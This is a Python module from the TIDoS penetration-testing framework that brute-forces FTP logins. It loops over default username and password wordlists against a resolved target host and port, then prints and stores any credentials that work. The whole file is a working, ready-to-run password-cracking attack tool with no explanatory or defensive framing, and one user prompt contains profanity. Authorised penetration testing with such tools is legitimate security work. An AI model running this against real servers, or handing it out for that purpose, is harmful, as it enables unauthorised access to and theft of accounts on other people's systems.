#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import ftplib
import time
import socket
from time import sleep
from sys import exit
from core.Core.colors import *
from ftplib import FTP
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

ftppass = []
ftpuser = []

info = "FTP password cracker for common users using dictionaries."
searchinfo = "FTP Login Cracker"
properties = {}

def ftpBrute0x00(ip, usernames, passwords, port, delay):

    ftp = FTP()
    found = False
    for username in usernames:
        for password in passwords:
            try:
                ftp.connect(ip, port)
                ftp.login(username, password)
                print(G + ' [+] Username: %s | Password found: %s\n' % (username, password))
                found = True
                data = username + " : " + password
                save_data(database, module, lvl1, lvl2, lvl3, name, data)
                ftp.quit()
                exit(0)
            except ftplib.error_perm:
                print(GR+ " [*] Checking : "+C+"Username: {} | ".format(username)+B+"Password: {} ".format(password)+R+"| Incorrect!\n")
                sleep(delay)
            except ftplib.all_errors as e:
                print(R+" [-] Error caught! Name: "+str(e))
            except KeyboardInterrupt:
                if not found:
                    data = "Nothing found."
                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
                ftp.quit()
    if not found:
        data = "Nothing found."
        save_data(database, module, lvl1, lvl2, lvl3, name, data)


def ftpbrute(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Brute Force Tools"
    global lvl3
    lvl3 = ""
    time.sleep(0.6)
    #print(R+'    ===================')
    #print(R+'\n     F T P   B R U T E ')
    #print(R+'    ---<>----<>----<>--\n')
    from core.methods.print import pbrute
    pbrute("FTP")
                 
    with open('files/brute-db/ftp/ftp_defuser.lst') as users:
        for user in users:
            user = user.strip('\n')
            ftpuser.append(user)
    with open('files/brute-db/ftp/ftp_defpass.lst') as passwd:
        for passw in passwd:
            passw = passw.strip('\n')
            ftppass.append(passw)

    web = web.replace('https://','')
    web = web.replace('http://','')
    ip = socket.gethostbyname(web)
    w = input(O+' [§] Use IP '+R+ip+' ? (y/n) :> ')
    if w == 'y' or w == 'Y':
        port = input(O+' [§] Enter the port (eg. 21) :> ')
        delay = input(C+' [§] Delay between each request (eg. 0.2) :> ')
        print(B+' [*] Initiating module...')
        time.sleep(1)
        print(GR+' [*] Trying using default credentials...')
        ftpBrute0x00(ip, ftpuser, ftppass, port, delay)
    elif w == 'n' or w == 'N':
        ip = input(O+' [§] Enter IP :> ')
        port = input(O+' [§] Enter the port (eg. 21) :> ')
        delay = input(C+' [§] Delay between each request (eg. 0.2) :> ')
        print(B+' [*] Initiating module...')
        time.sleep(1)
        print(GR+' [*] Trying using default credentials...')
        ftpBrute0x00(ip, ftpuser, ftppass, port, delay)
    else:
        print(R+' [-] Sorry fam you typed shit!')
        sleep(0.7)
    print(G+' [+] Done!')

def attack(web):
    web = web.fullurl
    ftpbrute(web)
